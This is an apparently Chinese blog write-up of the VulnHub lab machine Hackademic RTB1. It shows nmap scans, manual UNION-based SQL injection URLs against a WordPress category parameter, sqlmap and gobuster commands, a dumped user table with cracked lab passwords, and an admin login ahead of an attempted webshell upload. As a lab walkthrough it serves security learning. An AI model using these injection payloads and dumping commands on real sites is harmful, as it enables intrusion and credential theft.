<!DOCTYPE html>
<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
    
    <link rel="icon" href="https://avatars.githubusercontent.com/u/154585050?v=4"><script>
        let theme = localStorage.getItem("meek_theme") || "light";
        document.documentElement.setAttribute("data-color-mode", theme);
    </script>
<meta name="description" content="# 靶机信息
hackadmic-RTB1是vulnhub平台发布的一个难度初级的渗透测试靶机
# 初始信息收集
## 靶机端口扫描
tcp端口扫描
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/hackadmic_rTB1]
└─$ sudo nmap -sT -p- --min-rate 10000 192.168.218.190 -oA ./nmapScan/default
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 08:23 EDT
Nmap scan report for 192.168.218.190
Host is up (0.00040s latency).
Not shown: 65520 filtered tcp ports (no-response), 13 filtered tcp ports (host-unreach)
PORT   STATE  SERVICE
22/tcp closed ssh
80/tcp open   http
MAC Address: 00:0C:29:01:8A:4D (VMware)

Nmap done: 1 IP address (1 host up) scanned in 13.40 seconds

```
udp端口扫描
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/hackadmic_rTB1]
└─$ sudo nmap -sU -p- --min-rate 10000 192.168.218.190 -oA nmapScan/udpPort 
[sudo] kali 的密码：
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 08:23 EDT
Warning: 192.168.218.190 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.218.190
Host is up (0.00087s latency).
All 65535 scanned ports on 192.168.218.190 are in ignored states.
Not shown: 65470 open|filtered udp ports (no-response), 65 filtered udp ports (host-prohibited)
MAC Address: 00:0C:29:01:8A:4D (VMware)

Nmap done: 1 IP address (1 host up) scanned in 72.91 seconds

```

详细端口服务扫描
```
┌──(kali㉿kali)-[~/…/writeup/vulnhub/hackadmic_rTB1/nmapScan]
└─$ cat detail.nmap 
# Nmap 7.95 scan initiated Tue Jul 22 08:31:51 2025 as: /usr/lib/nmap/nmap -sCV -p22,80 -O -oA nmapScan/detail 192.168.218.190
Nmap scan report for 192.168.218.190
Host is up (0.00032s latency).

PORT   STATE  SERVICE VERSION
22/tcp closed ssh
80/tcp open   http    Apache httpd 2.2.15 ((Fedora))
|_http-server-header: Apache/2.2.15 (Fedora)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Hackademic.RTB1  
MAC Address: 00:0C:29:01:8A:4D (VMware)
Device type: general purpose|media device|router|webcam|WAP
Running (JUST GUESSING): Linux 2.6.X|3.X|5.X (98%), LG embedded (92%), MikroTik RouterOS 7.X (91%), Tandberg embedded (91%), Infomir embedded (91%)
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5.10 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/h:infomir:mag-250 cpe:/o:linux:linux_kernel:2.6.32
Aggressive OS guesses: Linux 2.6.22 - 2.6.36 (98%), Linux 2.6.23 - 2.6.38 (94%), Linux 2.6.31 - 2.6.35 (94%), Linux 2.6.32 - 2.6.39 (93%), LG Bp430 Blu-ray Player (92%), Linux 2.6.32 (92%), Linux 2.6.22 (92%), Linux 2.6.32 - 3.13 (91%), OpenWrt 22.03 (Linux 5.10) (91%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 22 08:32:06 2025 -- 1 IP address (1 host up) scanned in 15.01 seconds

```
同时可以使用漏洞脚本扫描一下
```
┌──(kali㉿kali)-[~/…/writeup/vulnhub/hackadmic_rTB1/nmapScan]                                                                                                                 08:35:21 [4/82]
└─$ sudo nmap -sC --script=vuln -p22,80 192.168.218.190 -oA vuln                                                                                                                             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 08:32 EDT                                                                                                                              
Nmap scan report for 192.168.218.190                                                                                                                                                         
Host is up (0.00025s latency).                                                                                                                                                               

PORT   STATE  SERVICE                                                                         
22/tcp closed ssh                                                                             
80/tcp open   http                                                                            
| http-slowloris-check:                                                                       
|   VULNERABLE:                                                                               
|   Slowloris DOS attack                                                                      
|     State: LIKELY VULNERABLE                                                                
|     IDs:  CVE:CVE-2007-6750                                                                 
|       Slowloris tries to keep many connections to the target web server open and hold                                                                                                      
|       them open as long as possible.  It accomplishes this by opening connections to                                                                                                       
|       the target web server and sending a partial request. By doing so, it starves                                                                                                         
|       the http server's resources causing Denial Of Service.                                                                                                                               
|                                                                                             
|     Disclosure date: 2009-09-17                                                             
|     References:                                                                             
|       http://ha.ckers.org/slowloris/                                                        
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750                                                                                                                         
|_http-dombased-xss: Couldn't find any DOM based XSS.                                                                                                                                        
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.                                                                                                                             
|_http-csrf: Couldn't find any CSRF vulnerabilities.                                                                                                                                         
|_http-trace: TRACE is enabled                                                                
| http-vuln-cve2011-3192:                                                                     
|   VULNERABLE:                                                                               
|   Apache byterange filter DoS                                                               
|     State: VULNERABLE                                                                       
|     IDs:  BID:49303  CVE:CVE-2011-3192                                                      
|       The Apache web server is vulnerable to a denial of service attack when numerous                                                                                                      
|       overlapping byte ranges are requested.                                                
|     Disclosure date: 2011-08-19                                                             
|     References:                                                                             
|       https://www.tenable.com/plugins/nessus/55976                                                                                                                                         
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192                                                                                                                         
|       https://seclists.org/fulldisclosure/2011/Aug/175                                                                                                                                     
|_      https://www.securityfocus.com/bid/49303                                               
| http-enum:                                                                                  
|_  /icons/: Potentially interesting folder w/ directory listing                                                                                                                             
MAC Address: 00:0C:29:01:8A:4D (VMware)                                                       

Nmap done: 1 IP address (1 host up) scanned in 146.21 seconds  
```
借本扫描结束，只扫描到两个端口，ssh是close状态，漏洞脚本扫描都是dos攻击，没什么用，开始手工枚举信息。">
<meta property="og:title" content="hackadmic-RTB1">
<meta property="og:description" content="# 靶机信息
hackadmic-RTB1是vulnhub平台发布的一个难度初级的渗透测试靶机
# 初始信息收集
## 靶机端口扫描
tcp端口扫描
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/hackadmic_rTB1]
└─$ sudo nmap -sT -p- --min-rate 10000 192.168.218.190 -oA ./nmapScan/default
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 08:23 EDT
Nmap scan report for 192.168.218.190
Host is up (0.00040s latency).
Not shown: 65520 filtered tcp ports (no-response), 13 filtered tcp ports (host-unreach)
PORT   STATE  SERVICE
22/tcp closed ssh
80/tcp open   http
MAC Address: 00:0C:29:01:8A:4D (VMware)

Nmap done: 1 IP address (1 host up) scanned in 13.40 seconds

```
udp端口扫描
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/hackadmic_rTB1]
└─$ sudo nmap -sU -p- --min-rate 10000 192.168.218.190 -oA nmapScan/udpPort 
[sudo] kali 的密码：
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 08:23 EDT
Warning: 192.168.218.190 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.218.190
Host is up (0.00087s latency).
All 65535 scanned ports on 192.168.218.190 are in ignored states.
Not shown: 65470 open|filtered udp ports (no-response), 65 filtered udp ports (host-prohibited)
MAC Address: 00:0C:29:01:8A:4D (VMware)

Nmap done: 1 IP address (1 host up) scanned in 72.91 seconds

```

详细端口服务扫描
```
┌──(kali㉿kali)-[~/…/writeup/vulnhub/hackadmic_rTB1/nmapScan]
└─$ cat detail.nmap 
# Nmap 7.95 scan initiated Tue Jul 22 08:31:51 2025 as: /usr/lib/nmap/nmap -sCV -p22,80 -O -oA nmapScan/detail 192.168.218.190
Nmap scan report for 192.168.218.190
Host is up (0.00032s latency).

PORT   STATE  SERVICE VERSION
22/tcp closed ssh
80/tcp open   http    Apache httpd 2.2.15 ((Fedora))
|_http-server-header: Apache/2.2.15 (Fedora)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Hackademic.RTB1  
MAC Address: 00:0C:29:01:8A:4D (VMware)
Device type: general purpose|media device|router|webcam|WAP
Running (JUST GUESSING): Linux 2.6.X|3.X|5.X (98%), LG embedded (92%), MikroTik RouterOS 7.X (91%), Tandberg embedded (91%), Infomir embedded (91%)
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5.10 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/h:infomir:mag-250 cpe:/o:linux:linux_kernel:2.6.32
Aggressive OS guesses: Linux 2.6.22 - 2.6.36 (98%), Linux 2.6.23 - 2.6.38 (94%), Linux 2.6.31 - 2.6.35 (94%), Linux 2.6.32 - 2.6.39 (93%), LG Bp430 Blu-ray Player (92%), Linux 2.6.32 (92%), Linux 2.6.22 (92%), Linux 2.6.32 - 3.13 (91%), OpenWrt 22.03 (Linux 5.10) (91%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 22 08:32:06 2025 -- 1 IP address (1 host up) scanned in 15.01 seconds

```
同时可以使用漏洞脚本扫描一下
```
┌──(kali㉿kali)-[~/…/writeup/vulnhub/hackadmic_rTB1/nmapScan]                                                                                                                 08:35:21 [4/82]
└─$ sudo nmap -sC --script=vuln -p22,80 192.168.218.190 -oA vuln                                                                                                                             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 08:32 EDT                                                                                                                              
Nmap scan report for 192.168.218.190                                                                                                                                                         
Host is up (0.00025s latency).                                                                                                                                                               

PORT   STATE  SERVICE                                                                         
22/tcp closed ssh                                                                             
80/tcp open   http                                                                            
| http-slowloris-check:                                                                       
|   VULNERABLE:                                                                               
|   Slowloris DOS attack                                                                      
|     State: LIKELY VULNERABLE                                                                
|     IDs:  CVE:CVE-2007-6750                                                                 
|       Slowloris tries to keep many connections to the target web server open and hold                                                                                                      
|       them open as long as possible.  It accomplishes this by opening connections to                                                                                                       
|       the target web server and sending a partial request. By doing so, it starves                                                                                                         
|       the http server's resources causing Denial Of Service.                                                                                                                               
|                                                                                             
|     Disclosure date: 2009-09-17                                                             
|     References:                                                                             
|       http://ha.ckers.org/slowloris/                                                        
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750                                                                                                                         
|_http-dombased-xss: Couldn't find any DOM based XSS.                                                                                                                                        
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.                                                                                                                             
|_http-csrf: Couldn't find any CSRF vulnerabilities.                                                                                                                                         
|_http-trace: TRACE is enabled                                                                
| http-vuln-cve2011-3192:                                                                     
|   VULNERABLE:                                                                               
|   Apache byterange filter DoS                                                               
|     State: VULNERABLE                                                                       
|     IDs:  BID:49303  CVE:CVE-2011-3192                                                      
|       The Apache web server is vulnerable to a denial of service attack when numerous                                                                                                      
|       overlapping byte ranges are requested.                                                
|     Disclosure date: 2011-08-19                                                             
|     References:                                                                             
|       https://www.tenable.com/plugins/nessus/55976                                                                                                                                         
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192                                                                                                                         
|       https://seclists.org/fulldisclosure/2011/Aug/175                                                                                                                                     
|_      https://www.securityfocus.com/bid/49303                                               
| http-enum:                                                                                  
|_  /icons/: Potentially interesting folder w/ directory listing                                                                                                                             
MAC Address: 00:0C:29:01:8A:4D (VMware)                                                       

Nmap done: 1 IP address (1 host up) scanned in 146.21 seconds  
```
借本扫描结束，只扫描到两个端口，ssh是close状态，漏洞脚本扫描都是dos攻击，没什么用，开始手工枚举信息。">
<meta property="og:type" content="article">
<meta property="og:url" content="https://dehua-rd.github.io/post/hackadmic-RTB1.html">
<meta property="og:image" content="https://avatars.githubusercontent.com/u/154585050?v=4">
<title>hackadmic-RTB1</title>



</head>
<style>
body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
#footer {margin-top:64px; text-align: center;font-size: small;}

</style>

<style>
.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
.title-right{display:flex;margin:auto 0 0 auto;}
.title-right .circle{padding: 14px 16px;margin-right:8px;}
#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
#postBody hr{height:2px;}
#cmButton{height:48px;margin-top:48px;}
#comments{margin-top:64px;}
.g-emoji{font-size:24px;}
@media (max-width: 600px) {
    body {padding: 8px;}
    .postTitle{font-size:24px;}
}
.copy-feedback {
    display: none;
    position: absolute;
    top: 10px;
    right: 50px;
    color: var(--color-fg-on-emphasis);
    background-color: var(--color-fg-muted);
    border-radius: 3px;
    padding: 5px 8px;
    font-size: 12px;
}
</style>




<body>
    <div id="header">
<h1 class="postTitle">hackadmic-RTB1</h1>
<div class="title-right">
    <a href="https://dehua-rd.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
        <svg class="octicon" width="16" height="16">
            <path id="pathHome" fill-rule="evenodd"></path>
        </svg>
    </a>
    
    <a href="https://github.com/dehua-rd/dehua-rd.github.io/issues/7" target="_blank" class="btn btn-invisible circle" title="Issue">
        <svg class="octicon" width="16" height="16">
            <path id="pathIssue" fill-rule="evenodd"></path>
        </svg>
    </a>
    

    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
        <svg class="octicon" width="16" height="16" >
            <path id="themeSwitch" fill-rule="evenodd"></path>
        </svg>
    </a>

</div>
</div>
    <div id="content">
<div class="markdown-body" id="postBody"><h1>靶机信息</h1>
<p>hackadmic-RTB1是vulnhub平台发布的一个难度初级的渗透测试靶机</p>
<h1>初始信息收集</h1>
<h2>靶机端口扫描</h2>
<p>tcp端口扫描</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/hackadmic_rTB1]
└─$ sudo nmap -sT -p- --min-rate 10000 192.168.218.190 -oA ./nmapScan/default
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 08:23 EDT
Nmap scan report for 192.168.218.190
Host is up (0.00040s latency).
Not shown: 65520 filtered tcp ports (no-response), 13 filtered tcp ports (host-unreach)
PORT   STATE  SERVICE
22/tcp closed ssh
80/tcp open   http
MAC Address: 00:0C:29:01:8A:4D (VMware)

Nmap done: 1 IP address (1 host up) scanned in 13.40 seconds

</code></pre>
<p>udp端口扫描</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/hackadmic_rTB1]
└─$ sudo nmap -sU -p- --min-rate 10000 192.168.218.190 -oA nmapScan/udpPort 
[sudo] kali 的密码：
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 08:23 EDT
Warning: 192.168.218.190 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.218.190
Host is up (0.00087s latency).
All 65535 scanned ports on 192.168.218.190 are in ignored states.
Not shown: 65470 open|filtered udp ports (no-response), 65 filtered udp ports (host-prohibited)
MAC Address: 00:0C:29:01:8A:4D (VMware)

Nmap done: 1 IP address (1 host up) scanned in 72.91 seconds

</code></pre>
<p>详细端口服务扫描</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/…/writeup/vulnhub/hackadmic_rTB1/nmapScan]
└─$ cat detail.nmap 
# Nmap 7.95 scan initiated Tue Jul 22 08:31:51 2025 as: /usr/lib/nmap/nmap -sCV -p22,80 -O -oA nmapScan/detail 192.168.218.190
Nmap scan report for 192.168.218.190
Host is up (0.00032s latency).

PORT   STATE  SERVICE VERSION
22/tcp closed ssh
80/tcp open   http    Apache httpd 2.2.15 ((Fedora))
|_http-server-header: Apache/2.2.15 (Fedora)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Hackademic.RTB1  
MAC Address: 00:0C:29:01:8A:4D (VMware)
Device type: general purpose|media device|router|webcam|WAP
Running (JUST GUESSING): Linux 2.6.X|3.X|5.X (98%), LG embedded (92%), MikroTik RouterOS 7.X (91%), Tandberg embedded (91%), Infomir embedded (91%)
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5.10 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/h:infomir:mag-250 cpe:/o:linux:linux_kernel:2.6.32
Aggressive OS guesses: Linux 2.6.22 - 2.6.36 (98%), Linux 2.6.23 - 2.6.38 (94%), Linux 2.6.31 - 2.6.35 (94%), Linux 2.6.32 - 2.6.39 (93%), LG Bp430 Blu-ray Player (92%), Linux 2.6.32 (92%), Linux 2.6.22 (92%), Linux 2.6.32 - 3.13 (91%), OpenWrt 22.03 (Linux 5.10) (91%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 22 08:32:06 2025 -- 1 IP address (1 host up) scanned in 15.01 seconds

</code></pre>
<p>同时可以使用漏洞脚本扫描一下</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/…/writeup/vulnhub/hackadmic_rTB1/nmapScan]                                                                                                                 08:35:21 [4/82]
└─$ sudo nmap -sC --script=vuln -p22,80 192.168.218.190 -oA vuln                                                                                                                             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 08:32 EDT                                                                                                                              
Nmap scan report for 192.168.218.190                                                                                                                                                         
Host is up (0.00025s latency).                                                                                                                                                               

PORT   STATE  SERVICE                                                                         
22/tcp closed ssh                                                                             
80/tcp open   http                                                                            
| http-slowloris-check:                                                                       
|   VULNERABLE:                                                                               
|   Slowloris DOS attack                                                                      
|     State: LIKELY VULNERABLE                                                                
|     IDs:  CVE:CVE-2007-6750                                                                 
|       Slowloris tries to keep many connections to the target web server open and hold                                                                                                      
|       them open as long as possible.  It accomplishes this by opening connections to                                                                                                       
|       the target web server and sending a partial request. By doing so, it starves                                                                                                         
|       the http server's resources causing Denial Of Service.                                                                                                                               
|                                                                                             
|     Disclosure date: 2009-09-17                                                             
|     References:                                                                             
|       http://ha.ckers.org/slowloris/                                                        
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750                                                                                                                         
|_http-dombased-xss: Couldn't find any DOM based XSS.                                                                                                                                        
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.                                                                                                                             
|_http-csrf: Couldn't find any CSRF vulnerabilities.                                                                                                                                         
|_http-trace: TRACE is enabled                                                                
| http-vuln-cve2011-3192:                                                                     
|   VULNERABLE:                                                                               
|   Apache byterange filter DoS                                                               
|     State: VULNERABLE                                                                       
|     IDs:  BID:49303  CVE:CVE-2011-3192                                                      
|       The Apache web server is vulnerable to a denial of service attack when numerous                                                                                                      
|       overlapping byte ranges are requested.                                                
|     Disclosure date: 2011-08-19                                                             
|     References:                                                                             
|       https://www.tenable.com/plugins/nessus/55976                                                                                                                                         
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192                                                                                                                         
|       https://seclists.org/fulldisclosure/2011/Aug/175                                                                                                                                     
|_      https://www.securityfocus.com/bid/49303                                               
| http-enum:                                                                                  
|_  /icons/: Potentially interesting folder w/ directory listing                                                                                                                             
MAC Address: 00:0C:29:01:8A:4D (VMware)                                                       

Nmap done: 1 IP address (1 host up) scanned in 146.21 seconds  
</code></pre>
<p>借本扫描结束，只扫描到两个端口，ssh是close状态，漏洞脚本扫描都是dos攻击，没什么用，开始手工枚举信息。</p>
<h2>web信息枚举</h2>
<p>访问80端口，是一个挑战，获取 key.txt，给了明确的目标，应该不用扫描目录，算了还是挂个后台扫一下，果然啥也没扫到。</p>
<p>查看源码，源码最后一行有几个参数<br>
<code class="notranslate">&lt;p&gt;&amp;#8212;NickJames | &lt;a href="/Hackademic_RTB1/?p=9#comments"&gt;no comments&lt;/a&gt; &lt;br /&gt;&lt;small&gt;(posted in &lt;a href="/Hackademic_RTB1/?cat=1" title="View all posts in Uncategorized" rel="category tag"&gt;Uncategorized&lt;/a&gt;</code><br>
尝试更改 <strong>cat</strong> 和 <strong>p</strong> 参数的值，直到更换 <strong>cat</strong> 后面的值，页面发生改变，出现了 search 框，看来是<strong>sql注入</strong><br>
初学者，就手工爆了。<br>
<a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/98fea2b1-516e-4400-b6ed-49ccfe6d2d90"><img width="1919" height="1035" alt="Image" src="https://github.com/user-attachments/assets/98fea2b1-516e-4400-b6ed-49ccfe6d2d90" style="max-width: 100%; height: auto; max-height: 1035px;"></a></p>
<p>输入单引号报错显示，有对符号的转义</p>
<pre lang="WordPress" data-meta="database error: [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' LIMIT 1' at line 1]" class="notranslate"><code class="notranslate">SELECT * FROM wp_categories WHERE cat_ID = \\\' LIMIT 1
</code></pre>
<p>加的 <strong>/</strong> 转义，试试是不是宽字节注入，不行。后面又试别的，发现压根就没有符号闭合。</p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/df2121fd-e541-4553-b1c9-d6965289e7dc"><img width="1919" height="1037" alt="Image" src="https://github.com/user-attachments/assets/df2121fd-e541-4553-b1c9-d6965289e7dc" style="max-width: 100%; height: auto; max-height: 1037px;"></a></p>
<p>还是一步一步走，先判断表的列数，使用 <strong>group by</strong> 发现 6 报错，5 没有报错。<br>
<code class="notranslate">http://192.168.218.190/Hackademic_RTB1/?cat=1%20group%20by%205</code><br>
使用联合注入，发现第二位回显。<br>
<code class="notranslate">http://192.168.218.190/Hackademic_RTB1/?cat=0%20union%20select%201,database(),3,4,5#</code></p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/96b726eb-b83a-4062-94e8-d4da58eb3869"><img width="1919" height="1039" alt="Image" src="https://github.com/user-attachments/assets/96b726eb-b83a-4062-94e8-d4da58eb3869" style="max-width: 100%; height: auto; max-height: 1039px;"></a></p>
<p>一库 指的是 information_schema 数据库。这个数据库是 MySQL 的核心库，包含了所有数据库的元数据。它存储了关于数据库、表和字段的详细信息。</p>
<p>三表 是指 information_schema 数据库中的三个关键表：</p>
<ol>
<li>schemata 表：存放所有数据库的信息。</li>
<li>tables 表：存放所有表的信息。</li>
<li>columns 表：存放所有字段的信息。</li>
</ol>
<p>六字段 是指上述三表中的六个关键字段：</p>
<ol>
<li>schemata 表的 schema_name 字段：存放具体的数据库名。</li>
<li>tables 表的 table_name 字段：存放具体的表名。</li>
<li>tables 表的 table_schema 字段：存放表所在的数据库名。</li>
<li>columns 表的 column_name 字段：存放具体的字段名。</li>
<li>columns 表的 table_name 字段：存放字段所在的表名。</li>
<li>columns 表的 table_schema 字段：存放字段所在的数据库名。</li>
</ol>
<p>爆表的时候，引号会被 <strong>///</strong> 过滤，有点麻烦，直接sqlmap梭哈了</p>
<p><code class="notranslate">└─$ sudo sqlmap http://192.168.218.190/Hackademic_RTB1/?cat=1 --batch -D wordpress --tables --dump -o</code></p>
<p>拿到 wp_user 和 password 再扫描一下后台目录</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/…/hackadmic_rTB1/sqlmap/Key/192.168.218.190]
└─$ gobuster dir -u http://192.168.218.190/Hackademic_RTB1/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x php,html,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.218.190/Hackademic_RTB1/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 339] [--&gt; http://192.168.218.190/Hackademic_RTB1/wp-content/]
/wp-admin             (Status: 301) [Size: 337] [--&gt; http://192.168.218.190/Hackademic_RTB1/wp-admin/]
/wp-includes          (Status: 301) [Size: 340] [--&gt; http://192.168.218.190/Hackademic_RTB1/wp-includes/]
/xmlrpc.php           (Status: 200) [Size: 42]
/index.php            (Status: 500) [Size: 1881]
/wp-trackback.php     (Status: 200) [Size: 135]
/wp.php               (Status: 200) [Size: 1694]
/wp-feed.php          (Status: 200) [Size: 1607]
/wp-images            (Status: 301) [Size: 338] [--&gt; http://192.168.218.190/Hackademic_RTB1/wp-images/]
/wp-login.php         (Status: 200) [Size: 1474]
/readme.html          (Status: 200) [Size: 8783]
/license.txt          (Status: 200) [Size: 15127]
/wp-register.php      (Status: 200) [Size: 1437]
/wp-config.php        (Status: 200) [Size: 0]
/index.php            (Status: 500) [Size: 1881]
Progress: 224656 / 224660 (100.00%)
===============================================================
Finished
===============================================================

</code></pre>
<p>找一个带登录功能的页面wp-login.php，搜索cms指纹信息，看看有什么别的漏洞，但是都是sql输入漏洞已经利用过了，但是不小心搜到靶场复现了，有个文件上传字样，那么就开始找上传的位置了<br>
看之前使用sqlmap跑出来的wp_users表中的用户登录试一下,感觉admin密码权限高一点，试第一个NickJames:admin成功登录进来，只有一下简单的功能，也没有尝试出来什么利用点，再试试其他的用户。第二个密码没有跑出来试第三个 GeorgeMiller:q1w2e3</p>
<pre class="notranslate"><code class="notranslate">Database: wordpress                                                                                                                                                                                                                                                          
Table: wp_users
[6 entries]
+----+---------+----------+----------+----------+----------+----------+---------------------------------------------+-------------------------+------------+--------------+-------------+-------------+-------------+--------------+---------------+---------------+---------------+----------------+---------------------+------------------+---------------------+
| ID | user_ip | user_aim | user_icq | user_msn | user_url | user_yim | user_pass                                   | user_email              | user_level | user_login   | user_domain | user_idmode | user_status | user_browser | user_lastname | user_nicename | user_nickname | user_firstname | user_registered     | user_description | user_activation_key |
+----+---------+----------+----------+----------+----------+----------+---------------------------------------------+-------------------------+------------+--------------+-------------+-------------+-------------+--------------+---------------+---------------+---------------+----------------+---------------------+------------------+---------------------+
| 1  | &lt;blank&gt; | &lt;blank&gt;  | 0        | &lt;blank&gt;  | http://  | &lt;blank&gt;  | 21232f297a57a5a743894a0e4a801fc3 (admin)    | NickJames@hacked.com    | 1          | NickJames    | &lt;blank&gt;     | login       | 0           | &lt;blank&gt;      | James         | nickjames     | NickJames     | Nick           | 2010-10-25 20:40:23 | &lt;blank&gt;          | &lt;blank&gt;             |
| 2  | &lt;blank&gt; | &lt;blank&gt;  | 0        | &lt;blank&gt;  | http://  | &lt;blank&gt;  | b986448f0bb9e5e124ca91d3d650f52c            | JohnSmith@hacked        | 0          | JohnSmith    | &lt;blank&gt;     | login       | 0           | &lt;blank&gt;      | Smith         | johnsmith     | JohnSmith     | John           | 2010-10-25 21:25:22 | &lt;blank&gt;          | &lt;blank&gt;             |
| 3  | &lt;blank&gt; | &lt;blank&gt;  | 0        | &lt;blank&gt;  | http://  | &lt;blank&gt;  | 7cbb3252ba6b7e9c422fac5334d22054 (q1w2e3)   | GeorgeMiller@hacked.com | 10         | GeorgeMiller | &lt;blank&gt;     | nickname    | 0           | &lt;blank&gt;      | Miller        | georgemiller  | GeorgeMiller  | George         | 2011-01-07 03:08:51 | &lt;blank&gt;          | &lt;blank&gt;             |
| 4  | &lt;blank&gt; | &lt;blank&gt;  | 0        | &lt;blank&gt;  | http://  | &lt;blank&gt;  | a6e514f9486b83cb53d8d932f9a04292 (napoleon) | TonyBlack@hacked.com    | 0          | TonyBlack    | &lt;blank&gt;     | nickname    | 0           | &lt;blank&gt;      | Black         | tonyblack     | TonyBlack     | Tony           | 2011-01-07 03:09:55 | &lt;blank&gt;          | &lt;blank&gt;             |
| 5  | &lt;blank&gt; | &lt;blank&gt;  | 0        | &lt;blank&gt;  | http://  | &lt;blank&gt;  | 8601f6e1028a8e8a966f6c33fcd9aec4 (maxwell)  | JasonKonnors@hacked.com | 0          | JasonKonnors | &lt;blank&gt;     | nickname    | 0           | &lt;blank&gt;      | Konnors       | jasonkonnors  | JasonKonnors  | Jason          | 2011-01-07 03:10:36 | &lt;blank&gt;          | &lt;blank&gt;             |
| 6  | &lt;blank&gt; | &lt;blank&gt;  | 0        | &lt;blank&gt;  | http://  | &lt;blank&gt;  | 50484c19f1afdaf3841a0d821ed393d2 (kernel)   | MaxBucky@hacked.com     | 0          | MaxBucky     | &lt;blank&gt;     | nickname    | 0           | &lt;blank&gt;      | Bucky         | maxbucky      | MaxBucky      | Max            | 2011-01-07 03:11:18 | &lt;blank&gt;          | &lt;blank&gt;             |
+----+---------+----------+----------+----------+----------+----------+---------------------------------------------+-------------------------+------------+--------------+-------------+-------------+-------------+--------------+---------------+---------------+---------------+----------------+---------------------+------------------+---------------------+

</code></pre>
<p>GeorgeMiller登录上去，功能比较多，在这里发现了上传的地方。但是无法上传webshell</p>
